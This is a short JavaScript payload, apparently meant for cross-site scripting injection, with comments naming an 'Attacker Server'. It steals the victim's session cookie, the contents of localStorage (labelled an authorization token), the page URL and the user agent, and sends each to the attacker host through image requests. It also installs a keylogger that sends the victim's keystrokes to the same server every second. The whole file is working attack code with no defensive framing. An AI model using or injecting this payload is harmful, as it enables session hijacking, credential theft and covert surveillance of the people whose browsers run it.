var server = 'https://IP'; // Attacker Server
var keys='';
var url = window.location.href; // Gets URL
var cookie = document.cookie; // Gets Session Token
var auth = JSON.stringify(localStorage); // Gets Authorization Token
let user_agent = navigator.userAgent; // Gets User-Agent

document.onkeydown = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}

new Image().src = server + '/host.php?host=URL: ' + url; // Sends Url
new Image().src = server + '/host.php?host=Cookie: ' + cookie; // Sends Session Token
new Image().src = server + '/host.php?host=Authorization: ' + auth; // Sends Authorization Token
new Image().src = server + '/host.php?host=User-Agent: ' + user_agent; // Sends User-Agent

window.setInterval(function(){
if (keys.length >0) {
new Image().src = server + '/keylogger.php?c='+ keys.toLowerCase(); // Sends Keystrokes
keys='';
}
}, 1000);
